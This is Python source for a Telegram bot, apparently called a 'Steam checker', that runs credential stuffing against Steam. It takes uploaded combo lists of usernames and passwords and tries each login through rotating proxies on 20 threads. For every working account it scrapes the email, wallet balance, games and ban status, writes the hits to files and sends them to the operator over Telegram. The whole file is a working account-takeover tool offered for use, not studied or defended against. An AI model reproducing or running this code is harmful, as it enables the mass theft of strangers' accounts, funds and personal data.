#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
STEAM CHECKER TELEGRAM BOT - Based on Original Source Code
Fixed counters + Telegram integration
"""

import os
import time
import asyncio
import logging
import re
import random
import base64
import threading
from pathlib import Path
from urllib.parse import quote_plus
from concurrent.futures import ThreadPoolExecutor

import requests
from bs4 import BeautifulSoup
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_v1_5

from telegram import Update
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
from telegram.constants import ParseMode

# Config
TELEGRAM_TOKEN = os.getenv("TELEGRAM_TOKEN")
OWNER_ID = int(os.getenv("OWNER_ID", "0").strip())

if not TELEGRAM_TOKEN or OWNER_ID == 0:
    raise ValueError("Set TELEGRAM_TOKEN and numeric OWNER_ID in Railway Variables!")

MY_SIGNATURE = "@pyabrodie"
TELEGRAM_CHANNEL = "https://t.me/HoTmIlToOLs"

# Thread-safe stats
stats = {'valid': 0, 'invalid': 0, 'checked': 0, 'total': 0, 'start_time': None}
lock = threading.Lock()

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# ====================== ORIGINAL HELPERS ======================
def create_results_folder():
    Path("Results").mkdir(parents=True, exist_ok=True)

def save_hit(filename, data):
    filepath = os.path.join("Results", filename)
    if not os.path.exists(filepath):
        with open(filepath, 'w', encoding='utf-8') as f:
            f.write(f"# Created by {MY_SIGNATURE}\n\n")
    with open(filepath, 'a', encoding='utf-8') as f:
        f.write(f"{data}\n")

def shorten_games(games, limit=12):
    if not games:
        return "None"
    if len(games) > limit:
        return " | ".join(games[:limit]) + f" ... (+{len(games)-limit})"
    return " | ".join(games)

# ====================== ORIGINAL CHECKER (Best Version) ======================
def check_steam_account(combo, proxy_url=None):
    try:
        username, password = combo.strip().split(':', 1)
    except:
        return None

    user_clean = re.sub(r"@.*", "", username)
    session = requests.Session()
    session.verify = False
    if proxy_url:
        session.proxies = {"http": proxy_url, "https": proxy_url}

    headers = {
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 13_5 like Mac OS X) AppleWebKit/605.1.15",
        "Accept": "*/*",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "Origin": "https://steamcommunity.com",
        "X-Requested-With": "XMLHttpRequest",
    }
    session.headers.update(headers)

    try:
        # Get RSA
        now = str(int(time.time()))
        r1 = session.post("https://steamcommunity.com/login/getrsakey/", 
                         data=f"donotcache={now}&username={user_clean}", timeout=15)
        j1 = r1.json()
        if not j1.get("success"):
            return None

        modulus = j1.get("publickey_mod")
        exponent = j1.get("publickey_exp")
        timestamp = j1.get("timestamp")

        # Encrypt password (original method)
        n = int(modulus, 16)
        e = int(exponent, 16)
        rsa_key = RSA.construct((n, e))
        cipher = PKCS1_v1_5.new(rsa_key)
        encrypted = cipher.encrypt(password.encode("utf-8"))
        pass3 = quote_plus(base64.b64encode(encrypted).decode())

        # Login
        now2 = str(int(time.time()))
        payload = (f"donotcache={now2}&password={pass3}&username={user_clean}"
                   f"&twofactorcode=&emailauth=&rsatimestamp={timestamp}&remember_login=false")

        r2 = session.post("https://steamcommunity.com/login/dologin/", data=payload, timeout=15)
        j2 = r2.json()
        if not j2.get("success"):
            return None

        # Set cookies (original + extra domains)
        for cookie in r2.cookies:
            for domain in [".steamcommunity.com", ".steampowered.com", "steamcommunity.com", "steampowered.com"]:
                session.cookies.set(cookie.name, cookie.value, domain=domain)

        # Fetch details using original parsers
        time.sleep(0.5)
        r3 = session.get("https://store.steampowered.com/account/", timeout=15)
        email, balance, country = parse_account_page(r3.text)

        time.sleep(0.5)
        r4 = session.get("https://steamcommunity.com/my/profile/", timeout=15)
        total_games, level, limited = parse_profile_page(r4.text)

        games = []
        if int(total_games or 0) > 0:
            time.sleep(0.5)
            r5 = session.get("https://steamcommunity.com/my/games/?tab=all", timeout=15)
            games = parse_games_page(r5.text)

        vac_bans = game_bans = community_ban = "Unknown"
        if "profiles/" in r4.url:
            steamid = r4.url.split("/profiles/")[1].strip("/")
            time.sleep(0.5)
            r6 = session.get(f"https://steamcommunity.com/profiles/{steamid}", timeout=15)
            vac_bans, game_bans, community_ban = parse_ban_page(r6.text)

        result = {
            "username": username,
            "password": password,
            "email": email,
            "balance": balance,
            "country": country,
            "total_games": total_games,
            "games": games,
            "level": level,
            "limited": limited,
            "vac_bans": vac_bans,
            "game_bans": game_bans,
            "community_ban": community_ban,
        }
        return result

    except Exception as e:
        logger.debug(f"Check failed for {username}: {e}")
        return None

# ====================== ORIGINAL PARSERS ======================
def parse_account_page(html):
    email = balance = country = "Unknown"
    try:
        soup = BeautifulSoup(html, "html.parser")
        if elem := soup.find("input", {"id": "account_name"}):
            email = elem.get("value", "Unknown")
        if elem := soup.find("a", {"id": "header_wallet_balance"}):
            balance = elem.get_text(strip=True)
        if elem := soup.find("select", {"id": "account_country"}):
            if selected := elem.find("option", {"selected": True}):
                country = selected.get_text(strip=True)
    except: pass
    return email, balance, country

def parse_profile_page(html):
    total_games = "0"
    level = "0"
    limited = "No"
    try:
        soup = BeautifulSoup(html, "html.parser")
        if link := soup.find("a", href=re.compile(r"/games/")):
            if span := link.find("span", class_=re.compile("count")):
                if m := re.search(r'(\d+)', span.get_text()):
                    total_games = m.group(1)
        if lvl := soup.find("span", class_=re.compile("friendPlayerLevelNum")):
            level = lvl.get_text(strip=True)
        if "limited account" in html.lower():
            limited = "Yes"
    except: pass
    return total_games, level, limited

def parse_games_page(html):
    games = []
    try:
        soup = BeautifulSoup(html, "html.parser")
        for name_div in soup.find_all("div", class_="gameListRowItemName")[:30]:
            if title := name_div.get_text(strip=True):
                games.append(title)
    except: pass
    return games

def parse_ban_page(html):
    vac_bans = game_bans = "0"
    community_ban = "No"
    try:
        if m := re.search(r'(\d+)\s+VAC ban', html, re.I):
            vac_bans = m.group(1)
        if m := re.search(r'(\d+)\s+game ban', html, re.I):
            game_bans = m.group(1)
        if "community ban" in html.lower():
            community_ban = "Yes"
    except: pass
    return vac_bans, game_bans, community_ban

# ====================== PROCESSING ======================
def process_account(combo, proxies, chat_id, bot):
    proxy_url = None
    if proxies:
        proxy_line = random.choice(proxies).strip()
        if proxy_line.startswith(("http", "socks")):
            proxy_url = proxy_line

    result = check_steam_account(combo, proxy_url)

    if result:
        hit_line = f"{result['username']}:{result['password']}"
        save_hit("All_Hits.txt", hit_line)

        if result['email'] and result['email'] != "Unknown":
            data = f"{hit_line}\n{result['email']}:{result['password']}"
            save_hit("Valid_With_Email.txt", data)
        else:
            save_hit("Valid_Without_Email.txt", hit_line)

        # Send hit message
        games_str = shorten_games(result['games'])
        message = f"""✅ <b>STEAM HIT FOUND</b>

🔑 <code>{result['username']}:{result['password']}</code>
💰 Balance: {result['balance']}
🌍 Country: {result['country']}
🎮 Games: {result['total_games']} ({games_str})
📊 Level: {result['level']} | Limited: {result['limited']}
🚫 Bans: VAC:{result['vac_bans']} | Game:{result['game_bans']} | Comm:{result['community_ban']}
📧 Email: {result['email']}

💎 {MY_SIGNATURE}"""

        try:
            asyncio.run(bot.send_message(chat_id=chat_id, text=message, parse_mode=ParseMode.HTML))
        except:
            pass

        with lock:
            stats['valid'] += 1
    else:
        with lock:
            stats['invalid'] += 1

    with lock:
        stats['checked'] += 1

async def run_checker(combos, proxies, chat_id, bot):
    global stats
    with lock:
        stats = {'valid': 0, 'invalid': 0, 'checked': 0, 'total': len(combos), 'start_time': time.time()}

    create_results_folder()

    async def progress_task():
        while stats['checked'] < stats['total']:
            await asyncio.sleep(10)
            with lock:
                current_valid = stats['valid']
                current_checked = stats['checked']
            try:
                await bot.send_message(chat_id, f"🔄 Progress: {current_checked}/{stats['total']} | Valid: {current_valid}")
            except: pass

    asyncio.create_task(progress_task())

    with ThreadPoolExecutor(max_workers=20) as executor:
        futures = [executor.submit(process_account, combo, proxies, chat_id, bot) for combo in combos]
        for future in futures:
            try:
                future.result()
            except:
                pass

    # Final Summary
    with lock:
        elapsed = int(time.time() - stats['start_time'])
        summary = f"""✅ <b>SCAN COMPLETE</b>

⏱️ Time: {elapsed//60}m {elapsed%60}s
✅ Valid: {stats['valid']}
❌ Invalid: {stats['invalid']}
📊 Total: {stats['total']}

Results files sent.

💎 {MY_SIGNATURE}"""

    await bot.send_message(chat_id, summary, parse_mode=ParseMode.HTML)

    for fname in ["Valid_With_Email.txt", "Valid_Without_Email.txt", "All_Hits.txt"]:
        p = os.path.join("Results", fname)
        if os.path.exists(p) and os.path.getsize(p) > 50:
            await bot.send_document(chat_id, open(p, 'rb'), caption=fname)

# ====================== BOT HANDLERS ======================
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != OWNER_ID: return
    await update.message.reply_text(
        "🤖 <b>Steam Checker Bot Ready</b>\n\n"
        "Send .txt combo file\n"
        "Optional: proxies.txt\n"
        "/status", parse_mode=ParseMode.HTML)

async def status_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != OWNER_ID: return
    if stats['total'] == 0:
        await update.message.reply_text("No scan running.")
        return
    with lock:
        elapsed = int(time.time() - stats['start_time'])
        await update.message.reply_text(
            f"📊 Checked: {stats['checked']}/{stats['total']}\n"
            f"Valid: {stats['valid']}\nTime: {elapsed//60}m {elapsed%60}s", parse_mode=ParseMode.HTML)

async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != OWNER_ID: return
    doc = update.message.document
    if not doc.file_name.endswith('.txt'):
        await update.message.reply_text("Only .txt files!")
        return

    await update.message.reply_text(f"📥 Received: {doc.file_name}")
    file = await doc.get_file()
    path = f"/tmp/{doc.file_name}"
    await file.download_to_drive(path)

    if "proxy" in doc.file_name.lower():
        with open(path, encoding='utf-8', errors='ignore') as f:
            proxies = [line.strip() for line in f if line.strip()]
        context.user_data['proxies'] = proxies
        await update.message.reply_text(f"✅ Loaded {len(proxies)} proxies.")
        return

    with open(path, encoding='utf-8', errors='ignore') as f:
        combos = [line.strip() for line in f if ':' in line.strip()]

    await update.message.reply_text(f"✅ Loaded {len(combos)} accounts. Starting with 20 threads...")

    proxies = context.user_data.get('proxies', [])
    asyncio.create_task(run_checker(combos, proxies, update.effective_chat.id, context.bot))

# ====================== MAIN ======================
def main():
    create_results_folder()
    app = Application.builder().token(TELEGRAM_TOKEN).build()

    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("status", status_cmd))
    app.add_handler(MessageHandler(filters.Document.TEXT, handle_document))

    print("🚀 Steam Checker Bot Started (v7 - Original Logic)")
    app.run_polling()

if __name__ == "__main__":
    main()
